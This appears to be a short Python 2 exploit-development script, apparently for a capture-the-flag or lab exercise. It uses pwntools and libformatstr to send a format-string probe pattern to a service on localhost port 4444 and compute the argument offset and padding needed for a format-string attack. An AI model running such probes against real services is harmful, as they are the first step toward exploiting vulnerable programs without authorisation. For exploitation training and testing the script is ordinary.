from pwnlib.tubes.remote import remote
from pwnlib.util.packing import p32
from time import sleep
from libformatstr import make_pattern, guess_argnum

buf_size = 79

r = remote('127.0.0.1', 4444)

print r.recvuntil(':')
r.sendline(make_pattern(buf_size))
result = r.recvall()
print result
print "argnum:{}, padding:{}".format(*guess_argnum(result, buf_size))
